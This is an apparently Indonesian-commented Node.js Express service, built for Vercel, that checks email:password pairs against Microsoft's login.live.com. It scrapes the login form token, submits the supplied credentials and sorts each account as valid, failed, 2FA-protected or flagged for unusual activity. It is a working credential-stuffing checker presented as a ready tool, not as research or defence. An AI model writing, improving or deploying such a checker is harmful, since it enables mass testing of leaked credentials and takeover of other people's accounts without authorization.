const express = require('express');
const axios = require('axios');
const cheerio = require('cheerio');
const url = require('url');

const app = express();

// Fungsi untuk melakukan validasi
async function validateAccount(email, password) {
  const session = axios.create({
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'
    }
  });

  try {
    const initialResponse = await session.get("https://login.live.com", { maxRedirects: 5 });
    const $ = cheerio.load(initialResponse.data);
    
    const ppftInput = $('input[name="PPFT"]');
    const postUrlMatch = initialResponse.data.match(/urlPost:\'([^\']*)/);
    
    if (!ppftInput.length || !postUrlMatch) {
      return 'RETRY_ERROR';
    }

    const ppft = ppftInput.val();
    const loginUrl = postUrlMatch[1];
    
    const emailEncoded = encodeURIComponent(email);
    const passwordEncoded = encodeURIComponent(password);
    const ppftEncoded = encodeURIComponent(ppft);

    const loginPayload = `i13=0&login=${emailEncoded}&loginfmt=${emailEncoded}&type=11&LoginOptions=3&passwd=${passwordEncoded}&PPFT=${ppftEncoded}&PPSX=Pa&NewUser=1`;
    
    const loginResponse = await session.post(loginUrl, loginPayload, {
      headers: {
        'Origin': 'https://login.live.com',
        'Referer': loginUrl,
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      maxRedirects: 5
    });

    const responseTextLower = loginResponse.data.toLowerCase();
    const cookies = loginResponse.headers['set-cookie'] || [];
    const cookiesLower = cookies.join(';').toLowerCase();

    const failureKeys = ["that microsoft account doesn't exist", "your account or password is incorrect", "you've tried to sign in too many times"];
    const unusualActivityKeys = ["help us secure your account", "unusual activity"];
    const abuseKeys = ["identity/confirm", "abuse?mkt", "recover?mkt"];
    const twoFaKeys = ["/cancel?mkt=", "',cw:true", "email/confirm?mkt"];
    const validCookieKeys = ['wlssc', '__host-msaauth'];

    if (failureKeys.some(k => responseTextLower.includes(k))) return 'FAILED';
    if (unusualActivityKeys.some(k => responseTextLower.includes(k))) return 'UNUSUAL_ACTIVITY';
    if (abuseKeys.some(k => responseTextLower.includes(k))) return 'ABUSE';
    if (twoFaKeys.some(k => responseTextLower.includes(k))) return '2FA_PROTECTED';
    if (validCookieKeys.some(k => cookiesLower.includes(k))) return 'VALID';

    return 'RETRY_ERROR';
  } catch (error) {
    return 'NETWORK_ERROR';
  }
}

// Endpoint API Utama
app.get('*', async (req, res) => {
  const queryParams = url.parse(req.url, true).query;
  const paramValue = queryParams.param;

  if (!paramValue || !paramValue.includes(':')) {
    return res.status(400).json({ error: "Invalid format. Expected ?param=email:pass" });
  }

  try {
    const [email, password] = paramValue.split(':', 2);
    const status = await validateAccount(email, password);
    res.status(200).json({ email, status });
  } catch (e) {
    res.status(400).json({ error: "Invalid data format in 'param'. Expected email:pass" });
  }
});

// Ekspor aplikasi untuk Vercel
module.exports = app;
